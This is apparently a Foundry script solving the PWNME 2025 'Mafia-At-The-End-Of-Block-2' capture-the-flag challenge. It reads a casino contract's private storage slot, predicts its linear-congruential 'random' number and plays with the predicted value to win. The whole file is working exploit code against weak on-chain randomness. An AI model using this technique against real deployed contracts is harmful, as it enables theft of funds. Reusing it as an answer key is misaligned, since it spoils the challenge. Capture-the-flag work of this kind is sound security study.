//SPDX-License-Identifier-MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Setup,CasinoPWNME} from "src/PWNME-2025/Mafia-At-The-End-Of-Block-2/Setup.sol";
import "forge-std/StdJson.sol"; 


contract Solve is Script{
    using stdJson for string;
    
    function run()public{
        address _setup;
        string memory Setup_path=string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Setup_path){
            string memory json = vm.readFile(Setup_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            _setup=deployed;
        }catch{
            revert("Challenge Not Yet Deployed");
        }

        vm.startBroadcast();
        Setup setup=Setup(_setup);
        CasinoPWNME casino=setup.casino();
        Exploit exploit=new Exploit();
        uint256 state=uint256(vm.load(address(casino), bytes32(uint256(4))));
        exploit.pwn{value: 0.1 ether}(state, casino);
        require(setup.isSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }
}


contract Exploit{
    uint256 public multiplier = 14130161972673258133;
	uint256 public increment = 11367173177704995300;
	uint256 public modulus = 4701930664760306055;
    CasinoPWNME casino;
    function pwn(uint256 _state,CasinoPWNME _casino)public payable{
        casino=_casino;
        uint256 state = (multiplier * _state + increment) % modulus;
        casino.playCasino{value: 0.1 ether}(state);
    }
}


